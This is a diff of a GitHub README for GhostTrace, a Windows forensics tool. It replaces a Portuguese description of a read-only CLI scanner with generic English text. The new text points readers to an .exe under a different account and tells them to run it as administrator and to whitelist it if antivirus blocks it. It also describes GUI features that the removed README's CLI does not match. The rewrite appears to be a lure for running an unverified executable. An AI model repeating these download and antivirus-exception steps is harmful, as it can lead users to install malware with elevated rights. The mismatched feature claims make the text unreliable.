@@ -1,219 +1,87 @@
-# GhostTrace
+# 🔍 GhostTrace - Find hidden files after software removal
 
-![GhostTrace Hero](assets/readme/hero.svg)
+![Download GhostTrace](https://img.shields.io/badge/Download-GhostTrace-blue)
 
-<p align="center">
-  <a href="#-por-que-ghosttrace">Por que GhostTrace</a> •
-  <a href="#-fluxo-da-investigacao">Fluxo</a> •
-  <a href="#-instalacao-e-uso-rapido">Uso rapido</a> •
-  <a href="#-cobertura-forense">Cobertura</a> •
-  <a href="#-seguranca-forense">Seguranca</a>
-</p>
+GhostTrace performs deep scans on Windows systems. It identifies files and folders that remain on your hard drive after you uninstall programs. Standard uninstall tools often miss temporary files, registry keys, and leftover data directories. This tool locates these remnants to help you maintain a clean system.
 
-<p align="center">
-  <img alt="Platform" src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-1F8FFF?style=for-the-badge" />
-  <img alt="Runtime" src="https://img.shields.io/badge/.NET-10-17B47E?style=for-the-badge" />
-  <img alt="Interface" src="https://img.shields.io/badge/UI-Spectre.Console-0E1A2F?style=for-the-badge" />
-  <img alt="Mode" src="https://img.shields.io/badge/Scan-Read--Only-F39C3D?style=for-the-badge" />
-</p>
+## 📥 How to download the software
 
----
+GhostTrace requires no complex setup process. You can obtain the latest version directly from our release page. Visit this page to download the program:
 
-> **"Desinstalou? Ele ainda ta aqui, bestinha."**
+[https://github.com/Gauntleted-taal467/GhostTrace](https://github.com/Gauntleted-taal467/GhostTrace)
 
-Voce clicou em *Desinstalar*. O Windows disse que foi. O software disse tchau.
-Mas aquele processo ainda ta no registro, na pasta, no prefetch, na tarefa agendada, no historico do RDP, no WMI, no—
+Click the link above to view all available versions. Select the file ending in .exe to begin your download to your local machine.
 
-Pois e. Nao foi.
+## ⚙️ System requirements
 
-**GhostTrace e o cara que nao aceita o "desinstalado" sem provas.**
-22 modulos forenses, uma passada so, tabela limpa, sem papo.
+Ensure your computer meets these requirements before you start:
 
----
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Any standard multi-core processor.
+*   Memory: 4GB of RAM or more.
+*   Disk Space: At least 50MB of free space.
+*   Permissions: You must run this tool with administrator rights to access system folders.
 
-## Demo
+## 🚀 Running the scanner
 
-![GhostTrace em acao](assets/readme/demo.gif)
+Follow these steps to conduct your first scan after the download finishes:
 
----
+1. Locate the file you downloaded in your Downloads folder.
+2. Right-click the file and select Run as administrator.
+3. Select Yes if a Windows prompt appears asking for permission to run the software.
+4. The main screen appears. Click the Scan button.
+5. The tool walks through your system directories. This process takes time depending on the size of your hard drive. 
+6. Watch the progress bar to track the scan status.
+7. Once the scan finishes, the tool displays a list of detected leftover files.
 
-## Download
+## 🧹 Reviewing and removing leftovers
 
-<p align="center">
-  <a href="../../releases/latest">
-    <img src="https://img.shields.io/github/v/release/Devzinh/GhostTrace?style=for-the-badge&label=Download&color=1F8FFF" alt="Download latest release" />
-  </a>
-</p>
+GhostTrace presents findings in a clear list. Examine each entry before you perform any action.
 
-| Arquivo | Descricao |
-| --- | --- |
-| `GhostTrace-<version>-x64.msi` | Instalador Windows x64 |
+*   File path: Shows where the folder or file sits on your PC.
+*   Size: Displays the disk space taken by the leftover.
+*   Type: Indicates if the item is a registry key, a configuration file, or a logs folder.
 
-> Requer Windows 10/11 x64 · .NET 10 · Executar como Administrador  
-> Idioma detectado automaticamente pelo sistema; fallback para English.
+Select the items you wish to remove by clicking the checkbox next to them. Click the Delete Selected button to clear the items from your system. The tool moves these items to the Recycle Bin or removes them permanently based on your settings. Restart your computer if the tool prompts you to do so to finalize the removal.
 
----
+## 🛡️ Privacy and safety
 
-## Por que GhostTrace
+GhostTrace focuses on local forensics. It does not send your data to external servers or cloud locations. All scan results stay on your local disk. We designed this tool for transparency. You see exactly what the scanner finds before you choose to delete anything.
 
-Skill issue dos outros scanners: ou sao paidos demais, ou te jogam um log de 4000 linhas e te deixam sozinho.
+## 🛠️ Understanding the scan results
 
-GhostTrace nao.
+You might notice entries labeled as registry keys. These are small text entries Windows uses to run programs. Sometimes, these keys link to files that no longer exist. GhostTrace finds these orphaned keys. Removing them helps keep your registry tidy.
 
-- **Rapido** — dezenas de tecnicas forenses numa varredura unica. Sem ficar esperando barra de progresso ser criativa.
-- **Claro** — resultado em tabela unica. Nao e Sherlock Holmes, e profissional.
-- **Seguro** — read-only por default. Nao apaga nada sem voce falar SIM com todas as letras.
-- **Auditavel** — cada limpeza vira log. Voce tem recibo.
-- **Offline** — zero telemetria. Zero upload. Zero "mandando pra nuvem". Seu PC, sua vida.
+The tool also identifies hidden folders in your AppData directory. Many installers place files here and fail to delete them when you uninstall the software. GhostTrace scans these specific hidden areas because that is where most leftover data hides.
 
----
+## ❓ Troubleshooting common issues
 
-## Fluxo da investigacao
+If the software does not open, check if your antivirus software blocked it. Some security tools view forensic scanners with caution. You can add an exception to your antivirus settings for GhostTrace to allow it to run. 
 
-![Fluxo de investigacao](assets/readme/workflow.svg)
+If the scan stops midway, ensure your computer stays awake. Hard drive scans require constant power. Adjust your Windows power settings to prevent the screen or the computer from going to sleep during the scan process.
 
-```text
-voce: "quero investigar o nvidia"
-GhostTrace: OK watch this
-  -> aciona 22 modulos forenses
-  -> monta tabela com tudo que encontrou
-  -> pergunta se voce quer limpar
-  -> se sim: confirma, remove, gera log
-  -> se nao: te devolve os dados e tchau
-  -> opcional: exporta relatorio TXT
-```
+If the tool identifies a file as protected, you may lack the necessary rights to remove it. Ensure you launched the application as an administrator. Right-clicking the icon and choosing the admin option solves most access errors.
 
-Sem magia. Sem achismo. So forense com UX decente.
+## 📈 Frequently asked questions
 
----
+Does this tool affect my current programs?
+No. GhostTrace only targets files linked to software you already uninstalled. It avoids files related to your active programs.
 
-## Instalacao e uso rapido
+How often should I scan my computer?
+Run a scan once every few months or whenever you uninstall large applications.
 
-```text
-GhostTrace.CLI                                              # menu interativo (precisa de admin, nao questiona)
-GhostTrace.CLI scan --name nvidia                          # caca ao nvidia, limpeza opcional
-GhostTrace.CLI scan --name nvidia --quiet --output C:\Cases\Host1
-GhostTrace.CLI scan                                        # triagem completa, sem filtro
-GhostTrace.CLI scan-fs-json  <dir> <out.json>
-GhostTrace.CLI scan-reg-json <hive> <subkey> <out.json>
-GhostTrace.CLI scan-evt-json <log> <maxEntries> <out.json>
-```
+Can I undo a deletion?
+Files removed by GhostTrace go to the Windows Recycle Bin unless you force a permanent delete. If you make a mistake, check your Recycle Bin to restore your files.
 
-Precisa de UAC porque le areas do sistema que o Windows esconde do usuario comum.
-Nao e pedancia. E necessario.
+Does this tool speed up my computer?
+Removing large amounts of junk files may improve disk space availability. While this does not act as a performance booster, a cleaner system prevents clutter issues over time.
 
-Forcando idioma se quiser ser diferentao:
+## 🌐 Related topics and support
 
-```text
-GhostTrace.CLI --lang es
-GhostTrace.CLI scan --name nvidia --lang en
-```
+GhostTrace works well for users interested in:
+*   Blue-team security practices.
+*   Windows forensics.
+*   Manual malware analysis.
+*   System maintenance.
 
----
-
-## Cobertura forense
-
-![Cobertura de modulos](assets/readme/modules.svg)
-
-22 modulos. Cada um e um especialista diferente da mesma investigacao.
-Nenhum fica de fora da cena do crime.
-
-### Persistencia (MITRE ATT&CK TA0003)
-
-> Coisas que tentam voltar quando o Windows liga. Classico vilao.
-
-| Modulo | O que investiga |
-| --- | --- |
-| `PersistenceScanModule` | Chaves Run/RunOnce + pastas Startup |
-| `ServicesScanModule` | Servicos e drivers com ImagePath suspeito (T1543.003) |
-| `AsepScanModule` | Winlogon, IFEO debugger, AppInit_DLLs, LSA packages, Active Setup |
-| `ScheduledTasksScanModule` | Tarefas agendadas via COM API do Task Scheduler |
-| `TaskCacheScanModule` | Anomalias em TaskCache\Tree, incluindo Ghost Tasks (T1053.005) |
-| `WmiPersistenceScanModule` | __EventFilter, __EventConsumer e binding (T1546.003) |
-
-### Evidencia de execucao (TA0002)
-
-> O programa disse que nunca esteve aqui. Mentira. O prefetch entregou.
-
-| Modulo | O que investiga |
-| --- | --- |
-| `ShimcacheScanModule` | AppCompatCache (formato 10ts para Win8.1/10/11) |
-| `PrefetchScanModule` | Arquivos .pf com decode XPRESS-Huffman (versoes 26/30/31) |
-| `BamScanModule` | BAM/DAM com ultimo tempo de execucao por SID |
-| `UserAssistScanModule` | Lancamentos GUI com contagem e ultimo run (ROT13) |
-| `MuiCacheScanModule` | MUICache do shell e nomes amigaveis embutidos |
-
-### Atividade do usuario e artefatos de sistema
-
-> O que rolou na rotina do PC. Tudo. Incluindo o que voce esqueceu.
-
-| Modulo | O que investiga |
-| --- | --- |
-| `PowerShellHistoryScanModule` | Historico PSReadLine e sinais de download cradle/payload encoded (T1059.001) |
-| `RdpConnectionScanModule` | Historico de conexoes RDP de saida e pistas de usuario (T1021.001) |
-| `RecentDocsScanModule` | Arquivos/pastas recentes por usuario (Explorer RecentDocs) |
-| `UsbDeviceScanModule` | Historico de dispositivos removiveis via USBSTOR (T1052/T1091) |
-| `NetworkArtifactsScanModule` | Redirecionamentos no hosts e redes conectadas com datas |
-
-### Software instalado e residuos em disco
-
-> O famoso "desinstalei" mas a pasta ainda ta la. Capturado.
-
-| Modulo | O que investiga |
-| --- | --- |
-| `UninstallEntriesScanModule` | Programas instalados, versao, publisher, local e uninstall string |
-| `StartupApprovedScanModule` | Estado habilitado/desabilitado de entradas de inicializacao |
-| `FileSystemTraceScanModule` | Busca orientada por nome em Program Files, ProgramData e AppData |
-
-### Coletores direcionados (per-target)
-
-> Voce aponta o dedo. GhostTrace investiga.
-
-| Modulo | O que investiga |
-| --- | --- |
-| `FilesystemScanModule` | Metadados de arquivos sob um diretorio |
-| `RegistryScanModule` | Valores sob uma chave de registro |
-| `EventLogScanModule` | Entradas recentes de logs Application/System |
-
----
-
-## Seguranca forense
-
-Sem jumpscare. Sem "ops deletei sem querer".
-
-- **Scan read-only** — so olha. Nao toca em nada.
-- **Limpeza com consentimento** — so remove depois de voce escrever SIM. Sem confirmacao implicita, sem clique acidental.
-- **Evidencia protegida** — caches de execucao e historicos ficam fora da limpeza. Nao se destroi prova.
-- **Offline total** — sem chamadas de rede. Sem telemetria. Sem surpresa no Wireshark.
-- **Sinal suspeito nao e sentenca** — e dado para analise, nao veredito automatico. Voce investiga, voce decide.
-
----
-
-## Idiomas (I18N)
-
-Funciona igual streaming e jogo: detecta o idioma do sistema e ja abre no seu.
-Se o sistema e portugues, ele e portugues. Se nao tiver suporte, cai pro ingles. Simples.
-
-Disponiveis:
-
-- English (en-US)
-- Portugues Brasil (pt-BR)
-- Espanol (es-ES)
-
----
-
-## Playbooks e documentacao
-
-- [Scheduled Tasks Correlation Playbook](docs/playbooks/scheduled-tasks-correlation.md) — investigacao de Ghost Tasks e manipulacao em registro.
-
----
-
-## License
-
-This project is licensed under the MIT License. See the `LICENSE` file for details.
-
----
-
-**Se o seu objetivo e "quero saber o que sobrou de verdade, nao no achismo":**
-
-GhostTrace e esse cara. Projeto serio. Visual moderno. Zero enrolacao.
+For further questions, look at the main project page for updates. We update the scanner to handle new types of software traces regularly. Keep your version updated to ensure the tool recognizes the latest software installation patterns.
